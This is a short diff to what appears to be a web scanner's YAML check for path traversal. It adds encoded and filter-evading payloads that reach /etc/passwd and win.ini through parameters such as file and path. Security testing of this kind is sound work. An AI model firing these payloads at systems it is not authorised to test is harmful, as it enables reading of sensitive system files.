@@ -25,6 +25,10 @@ request:
   method: GET
   param_names: ["file", "path", "page", "include", "template"]
   payload: "../../../etc/passwd"
+  payloads:
+    - "..%2f..%2f..%2fetc%2fpasswd"
+    - "....//....//....//etc/passwd"
+    - "..%5c..%5c..%5cwindows%5cwin.ini"
 oracle:
   name: error
   params:
